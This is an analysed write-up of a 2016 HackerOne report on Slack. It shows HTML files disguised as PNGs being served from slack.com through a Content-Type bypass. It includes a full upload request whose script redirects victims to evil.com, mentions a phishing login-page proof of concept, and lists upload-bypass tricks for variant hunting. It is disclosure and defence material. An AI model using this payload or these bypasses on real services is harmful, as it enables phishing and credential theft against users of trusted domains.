# Open Redirect and HTML Injection via File Upload on slack.com

## Metadata
- **Source:** HackerOne
- **Report:** 140447 | https://hackerone.com/reports/140447
- **Submitted:** 2016-05-23
- **Reporter:** sudotop
- **Program:** Slack
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Open Redirect, HTML Injection, Content-Type Bypass, Stored XSS, Phishing, Malware Distribution
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker can upload HTML files disguised as images to Slack's file upload API by manipulating Content-Type headers and prepending binary characters, causing them to be served as executable HTML instead of being downloaded. This allows attackers to perform open redirects, inject malicious scripts, or host phishing pages on the slack.com domain, bypassing browser security warnings and user suspicions.

## Attack scenario
1. Attacker crafts a POST request to /api/files.uploadAsync with Content-Type: text/html but filename mimicking an image (pixel.png)
2. Attacker prepends binary characters before HTML/JavaScript content to evade file type detection mechanisms
3. Slack stores the file and generates a public shareable link (files.slack.com/files-pri/...)
4. Attacker tricks victim into clicking a crafted URL using slack.com/checkcookie?redir= or direct files.slack.com link
5. Victim's browser receives the file served with HTML Content-Type, executing embedded JavaScript or rendering phishing form
6. JavaScript redirect or form submission sends victim to attacker-controlled domain or exfiltrates credentials

## Root cause
Slack's file upload API and serving mechanism failed to properly validate file content types. The vulnerability stems from: (1) trusting user-supplied Content-Type headers without validating actual file content, (2) insufficient MIME type verification despite filename extension claims, (3) binary character prepending bypassing detection heuristics, and (4) serving user-uploaded content with the declared Content-Type without sandboxing, allowing script execution in the slack.com domain context.

## Attacker mindset
Opportunistic and creative exploitation of trust boundaries. The attacker recognized that Slack's domain carries inherent trust with users and explored ways to bypass file validation mechanisms. The addition of binary characters shows experimentation with obfuscation techniques. The progression from SVG files (report #104087) to HTML injection demonstrates iterative exploitation of similar validation weaknesses.

## Defensive takeaways
- Implement strict Content-Type validation by analyzing actual file magic bytes/headers, not user-supplied Content-Type headers
- Maintain a whitelist of allowed MIME types for upload and reject anything not matching actual file content
- Serve user-uploaded files from a completely separate domain (sandbox domain) without access to cookies or session tokens
- Implement Content-Security-Policy headers preventing script execution in uploaded content
- Add file type detection that strips binary prefixes before analyzing content (detect and reject obfuscation attempts)
- Use X-Content-Type-Options: nosniff header to prevent browser MIME type sniffing
- Scan uploaded files for embedded scripts, redirects, and suspicious content before serving
- Rate-limit or require additional verification for public link generation on files
- Implement robust filename validation to prevent extension spoofing
- Monitor for files served with mismatched extensions and content types

## Variant hunting
Test with polyglot files (valid image + HTML payload)
Attempt null-byte injection in filename to truncate extension (.html%00.png)
Try double extension attacks (.html.png, .php.jpg)
Test case sensitivity in extension filtering (.PNG, .Html)
Attempt encoding bypass (HTML entities, Unicode normalization)
Try different binary prefixes (BOM markers, file format headers) to trigger different execution paths
Test SVG files with embedded JavaScript/redirect elements
Attempt to upload .svg, .xml, .xhtml files with script payloads
Test if PDF files can contain embedded JavaScript execution
Check if ZIP/archive files are automatically extracted and executed
Verify if document preview functionality introduces additional execution paths
Test alternative file upload endpoints across Slack ecosystem

## MITRE ATT&CK
- T1190
- T1566
- T1589
- T1598
- T1204
- T1114
- T1199

## Notes
Report references prior vulnerability #104087 involving SVG file execution, indicating a pattern of file upload validation weaknesses. The two attack vectors presented show both indirect redirect (via checkcookie parameter) and direct serving (files.slack.com) exploitation. The phishing PoC demonstrates real-world impact potential. The use of binary character obfuscation is a sophisticated evasion technique. This vulnerability is particularly dangerous because slack.com domain is heavily trusted by enterprise users, making phishing and malware distribution highly credible.

## Full report
<details><summary>Expand</summary>

Hi, my report has tow interesting parts here
First
======
In this report #104087 the attacker uploads a svg file to execute JavaScript and redirect to any domain
I have found a new way to execute full html files on victim machine instead of downloading them by adding a bunch of binary chars before html code

### Please have a look at screenshots attached here to get what I mean.
### Steps
1. login to your account and send the following request:

Note: I can't get binary chars displayed here so I attached a file containing the whole request

```
POST /api/files.uploadAsync HTTP/1.1
Host: upload.slack.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Length: 886
Content-Type: multipart/form-data; boundary=---------------------------89481407720596
Origin: https://<subdomain>.slack.com
Connection: keep-alive

-----------------------------89481407720596
Content-Disposition: form-data; name="file"; filename="pixel.png"
Content-Type: text/html

<bunch_of_binary_chars_here>
<html>
<script>
window.location='http://www.evil.com';
</script>
</html>
-----------------------------89481407720596
Content-Disposition: form-data; name="filename"

pixel
-----------------------------89481407720596
Content-Disposition: form-data; name="token"

<token>
-----------------------------89481407720596
Content-Disposition: form-data; name="channels"

<channels>
-----------------------------89481407720596
Content-Disposition: form-data; name="title"

pixel
-----------------------------89481407720596
Content-Disposition: form-data; name="initial_comment"

hi
-----------------------------89481407720596--

```

2. Make public link for "pixel" file "https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee"

3. Complete link "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee"

4. Whenever a victim clicks the previous link he will get to "http://www.evil.com"

Second
======
I have found another way to make the redirect link very simple and more tricky
The attacker can just use slack main domain using this link "https://slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee" to redirect victims to "http://www.evil.com".

There are many other attack scenarios can be achieved here cause the attacker has full control over file content and name also.

Here is a simple phishing login page I have created as PoC that could trick even advanced users to submit their credentials to the attacker "https://slack.com/files-pri/T1ARLSGBS-F1AVC33M5/login?pub_secret=e80f120635" 

Attacker could do tons of fun stuff to the files, to my mind come Viruses, Exploits, Illegal Content, etc.

</details>

---
*Analysed by Claude on 2026-05-24*
